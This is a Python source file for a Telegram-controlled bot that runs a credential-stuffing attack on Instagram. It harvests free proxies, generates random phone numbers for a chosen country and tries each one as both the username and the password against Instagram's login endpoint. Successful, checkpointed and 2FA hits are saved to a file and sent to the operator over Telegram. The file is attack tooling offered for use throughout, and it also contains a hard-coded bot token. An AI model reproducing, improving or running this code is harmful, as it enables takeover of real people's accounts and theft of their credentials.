# ultimate_hunter.py - v4.0 (Self-Sustaining, Multi-Country, Interactive Bot)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime
import asyncio
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
)

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================

TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U" # ⚠️ استبدل بالتوكن الخاص بك
ADMIN_USER_ID = 1148797883 # ⚠️ استبدل بالـ ID الخاص بك

# --- قائمة الدول ذات الأولوية (قابلة للتعديل) ---
SUPPORTED_COUNTRIES = {
    "🇸🇦 Saudi Arabia": "966", "🇪🇬 Egypt": "20", "🇩🇪 Germany": "49", "🇫🇷 France": "33",
    "🇮🇷 Iran": "98", "🇱🇾 Libya": "218", "🇰🇼 Kuwait": "965", "🇦🇪 UAE": "971",
    "🇮🇶 Iraq": "964", "🇺🇸 USA": "1", "🇬🇧 UK": "44", "🇹🇷 Turkey": "90"
}

HITS_FILE = "hits.txt"
MAX_HUNTING_THREADS = 50 # يمكن زيادة هذا الرقم لأننا نستخدم بروكسيات كثيرة

# --- متغيرات الحالة العامة ---
is_hunting = False
hunt_task = None
hunt_stats = {
    "processed": 0, "total_targets": 0, "hits": 0, "start_time": None,
    "current_phase": "Idle", "country_code": "", "live_proxies": 0
}
# --- مخزون البروكسيات ---
proxy_inventory = queue.Queue()

# --- حالات المحادثة ---
SELECTING_COUNTRY = 1

# ==============================================================================
# SECTION 1: PROXY MANAGEMENT SYSTEM (The Workers)
# ==============================================================================

def _proxy_checker(q_in, q_out):
    """Worker: Takes a proxy from the input queue, checks it, and puts it in the output queue if it's live."""
    while True:
        proxy = q_in.get()
        try:
            requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
            q_out.put(proxy)
        except Exception:
            pass
        q_in.task_done()

async def _proxy_harvester(context: ContextTypes.DEFAULT_TYPE):
    """Manager: Continuously scrapes and checks proxies to keep the inventory full."""
    global proxy_inventory
    while True:
        if proxy_inventory.qsize() < 50: # إذا انخفض المخزون عن 50، ابدأ إعادة التعبئة
            try:
                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🏭 Proxy inventory low ({proxy_inventory.qsize()}). Starting harvester workers...")
                
                unchecked_proxies = queue.Queue()
                # Scrape from free-proxy-list.net
                response = await asyncio.to_thread(requests.get, "https://free-proxy-list.net/", timeout=15)
                soup = BeautifulSoup(response.content, 'html.parser')
                for row in soup.find("table", class_="table-striped").tbody.find_all("tr"):
                    ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
                    if is_https == 'yes':
                        unchecked_proxies.put(f"http://{ip}:{port}")
                
                # Start checker workers
                for _ in range(100): # 100 عامل فحص
                    threading.Thread(target=_proxy_checker, args=(unchecked_proxies, proxy_inventory), daemon=True).start()
                
                await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"👷‍♂️ Harvester deployed. Workers are now filling the inventory.")
            except Exception as e:
                print(f"Harvester Error: {e}")
        
        hunt_stats["live_proxies"] = proxy_inventory.qsize()
        await asyncio.sleep(60) # تحقق من المخزون كل دقيقة

# ==============================================================================
# SECTION 2: CORE HUNTING LOGIC
# ==============================================================================

def _instagram_worker(target_q):
    """Worker: Takes a target, gets a proxy, and attempts to log in."""
    global hunt_stats
    while True:
        username, password = target_q.get()
        
        try:
            proxy = proxy_inventory.get(timeout=10) # اسحب بروكسي من المخزون
        except queue.Empty:
            target_q.task_done()
            continue # لا توجد بروكسيات، تجاهل هذا الهدف

        try:
            # (هنا كود محاولة تسجيل الدخول الفعلي)
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
            proxies_dict = {"http": proxy, "https": proxy}
            with requests.Session() as s:
                r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
                csrf = r.cookies.get('csrftoken')
                if not csrf: raise Exception("Failed to get CSRF token")
                headers['x-csrftoken'] = csrf
                payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
                login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
                
                if login_r.status_code == 200:
                    data = login_r.json()
                    if data.get("authenticated"):
                        hunt_stats["hits"] += 1
                        asyncio.run(send_hit_notification("SUCCESS", username, password))
                    elif "checkpoint_url" in login_r.text:
                        hunt_stats["hits"] += 1
                        asyncio.run(send_hit_notification("CHECKPOINT", username, password))
                    elif data.get("two_factor_required"):
                        hunt_stats["hits"] += 1
                        asyncio.run(send_hit_notification("2FA", username, password))
                    else:
                        # كلمة مرور خاطئة، البروكسي صالح، أعده للمخزون
                        proxy_inventory.put(proxy)
                else:
                    # البروكسي محروق على الأغلب، لا تعيده للمخزون
                    pass
        except Exception:
            # أي خطأ آخر يعني أن البروكسي محروق على الأغلب
            pass
        finally:
            hunt_stats["processed"] += 1
            target_q.task_done()

async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str):
    """Manager: Starts and manages the hunting process for a specific country."""
    global is_hunting, hunt_stats
    is_hunting = True
    
    hunt_stats.update({
        "processed": 0, "total_targets": 0, "hits": 0, "start_time": time.time(),
        "current_phase": "Hunting", "country_code": country_code
    })

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🎯 **Hunt started for country code: +{country_code}**")
    
    target_queue = queue.Queue()
    
    # توليد الأهداف ووضعها في طابور العمل
    # (يمكنك زيادة هذا الرقم للحصول على قائمة أكبر)
    num_targets = 5000 
    for _ in range(num_targets):
        # توليد رقم من 7-9 أرقام عشوائياً
        random_part = ''.join(random.choice('0123456789') for _ in range(random.randint(7, 9)))
        target_queue.put((f"{country_code}{random_part}", f"{country_code}{random_part}"))
    
    hunt_stats["total_targets"] = num_targets
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {num_targets} targets. Deploying hunter workers...")

    # تشغيل عمال الصيد
    for _ in range(MAX_HUNTING_THREADS):
        threading.Thread(target=_instagram_worker, args=(target_queue,), daemon=True).start()

    target_queue.join() # انتظر حتى يتم فحص كل الأهداف

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Hunt Finished!**\nAll targets have been attempted.")
    is_hunting = False
    hunt_stats["current_phase"] = "Finished"

# ==============================================================================
# SECTION 3: TELEGRAM HANDLERS & CONVERSATION
# ==============================================================================

# --- فلتر المدير ---
class AdminFilter(filters.BaseFilter):
    def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
admin_filter = AdminFilter()

async def send_hit_notification(status, username, password):
    """Sends a formatted hit notification to the admin."""
    bot = Application.builder().token(TELEGRAM_BOT_TOKEN).build().bot
    result_message = f"🎯 *HIT FOUND!* ({hunt_stats['hits']}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
    await bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
    with open(HITS_FILE, "a") as f:
        f.write(f"{username}:{password} | Status: {status}\n")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to the Ultimate Hunter Bot v4.0!**\n\n"
        "▶️ `/hunt` - Start a new hunt.\n"
        "🛑 `/stophunt` - Stop the current hunt.\n"
        "📊 `/status` - Get a live progress report."
    , parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_hunting:
        await update.message.reply_text("⚠️ A hunt is already in progress.")
        return ConversationHandler.END
    country_list_text = "\n".join([f"`{code}` - {name}" for name, code in SUPPORTED_COUNTRIES.items()])
    await update.message.reply_text(f"🌍 **Select a Country** 🌍\n\n{country_list_text}", parse_mode='Markdown')
    return SELECTING_COUNTRY

async def received_country_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hunt_task
    country_code = update.message.text.strip()
    if not country_code.isdigit():
        await update.message.reply_text("❌ Invalid input. Please send numbers only.")
        return SELECTING_COUNTRY
    await update.message.reply_text(f"🚀 **Command received!** Starting hunt for `+{country_code}`.", parse_mode='Markdown')
    hunt_task = asyncio.create_task(the_hunt(context, country_code))
    return ConversationHandler.END

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # (هذا الجزء لم يتغير)
    pass

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_hunting:
        await update.message.reply_text("🅾️ **Status:** The bot is idle. Use `/hunt` to start.")
        return
    
    percentage = (hunt_stats["processed"] / hunt_stats["total_targets"] * 100) if hunt_stats["total_targets"] > 0 else 0
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - hunt_stats["start_time"]))
    
    status_message = (
        f"📊 **Live Hunt Status** 📊\n\n"
        f"▪️ **Country Code:** `+{hunt_stats['country_code']}`\n"
        f"▪️ **Phase:** `{hunt_stats['current_phase']}`\n"
        f"▪️ **Progress:** {hunt_stats['processed']} / {hunt_stats['total_targets']} checked.\n"
        f"▪️ **Completion:** `{percentage:.2f}%`\n"
        f"▪️ **Successful Hits:** `{hunt_stats['hits']}`\n"
        f"▪️ **Live Proxies in Stock:** `{hunt_stats['live_proxies']}`\n"
        f"▪️ **Time Elapsed:** `{elapsed_time}`"
    )
    await update.message.reply_text(status_message, parse_mode='Markdown')

async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hunt selection cancelled.")
    return ConversationHandler.END

# ==============================================================================
# SECTION 4: MAIN APPLICATION
# ==============================================================================

def main():
    print("--- ULTIMATE HUNTER BOT v4.0 is starting... ---")
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    
    # --- إعداد محادثة الصيد ---
    hunt_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("hunt", hunt_command, filters=admin_filter)],
        states={SELECTING_COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND & admin_filter, received_country_code)]},
        fallbacks=[CommandHandler("cancel", cancel_conversation)]
    )
    
    application.add_handler(hunt_conv_handler)
    application.add_handler(CommandHandler("start", start_command, filters=admin_filter))
    application.add_handler(CommandHandler("stophunt", stophunt_command, filters=admin_filter))
    application.add_handler(CommandHandler("status", status_command, filters=admin_filter))
    
    # --- تشغيل جامع البروكسيات في الخلفية ---
    asyncio.create_task(_proxy_harvester(application))
    
    print("Bot is now listening for commands on Telegram.")
    application.run_polling()

if __name__ == "__main__":
    main()
